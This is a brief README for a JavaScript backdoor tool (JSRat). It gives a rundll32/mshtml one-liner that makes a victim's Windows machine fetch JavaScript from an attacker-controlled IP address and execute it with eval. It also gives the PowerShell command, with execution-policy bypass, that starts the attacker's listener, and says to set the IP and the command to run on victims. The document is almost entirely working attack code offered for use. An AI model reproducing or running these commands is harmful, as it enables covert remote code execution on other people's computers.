#Javascript Backdoor

http://en.wooyun.io/2016/01/18/JavaScript-Backdoor.html

##Victim machine

```rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.174.131/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}```


##Attacker machine

```powershell.exe -ExecutionPolicy Bypass -File JSRat.ps1```

##Important

Update the IP address in JSRat.ps1 (line 19) and the command to be executed on victim machine.
